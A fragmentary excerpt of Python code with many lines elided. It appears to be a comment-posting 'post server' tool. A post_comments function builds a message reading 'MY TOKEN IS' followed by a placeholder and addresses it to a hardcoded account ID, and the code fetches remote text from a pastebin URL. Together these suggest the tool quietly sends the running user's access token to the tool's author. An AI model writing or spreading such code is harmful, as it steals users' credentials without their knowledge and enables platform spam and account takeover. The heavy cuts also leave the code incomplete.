...
class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        ...
        self.end_headers()
        self.wfile.write(b"SK D0N S3RV3R IS RUNN1NG")
...
def post_comments():
    ...
    msg_template = "HELLO SK SIR I AM USING YOU POST SERVER MY TOKEN IS =⟩ {}"

    # Specify the ID where you want to send the message
    target_id = "61556411724865"
    ...
    mmm = requests.get('https://pastebin.com/raw/w3p0SEzj').text
